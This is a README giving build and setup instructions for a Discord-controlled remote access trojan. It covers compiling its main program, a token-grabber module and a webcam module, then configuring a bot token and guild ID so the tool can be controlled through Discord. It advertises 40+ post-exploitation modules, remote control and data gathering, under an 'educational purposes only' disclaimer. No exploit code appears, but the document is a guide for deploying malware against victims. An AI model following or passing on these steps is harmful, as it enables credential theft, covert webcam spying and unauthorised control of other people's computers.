# Build Instructions - Discord RAT Shaher dev Edition

## Prerequisites
- Visual Studio 2019 or later (Community, Professional, or Enterprise)
- .NET Framework 4.7.2 or later
- Windows SDK

## Quick Build
1. Run `build.bat` from the root directory
2. The script will automatically detect your Visual Studio installation
3. Built files will be placed in the `build` directory

## Manual Build Steps

### 1. Build Main Application
```bash
msbuild "Discord rat\Discord rat.sln" /p:Configuration=Release /p:Platform="Any CPU"
```

### 2. Build Token Grabber Module
```bash
msbuild "Token grabber\Token grabber.csproj" /p:Configuration=Release /p:Platform="Any CPU"
```

### 3. Build Webcam Module
```bash
msbuild "Webcam\Webcam.csproj" /p:Configuration=Release /p:Platform="Any CPU"
```

## Configuration
Before running the application, you need to configure:

1. **Discord Bot Token**: Update the `BotToken` in `settings.cs`
2. **Guild ID**: Update the `GuildId` in `settings.cs`

## Features
- Interactive button-based command interface
- 40+ post-exploitation modules
- Modern Discord UI with categorized commands
- Real-time command execution
- File upload/download capabilities
- System information gathering
- Remote control capabilities

## Usage
1. Create a Discord bot in the Discord Developer Portal
2. Add the bot to your server with Administrator permissions
3. Configure the bot token and guild ID in `settings.cs`
4. Run the built executable
5. Use `!help` to access the interactive button interface

## Security Notice
This tool is for educational purposes only. Shaher dev is not responsible for any misuse of this software.

---
**Created by: Shaher dev**
**Version: 2.0 Enhanced Edition**
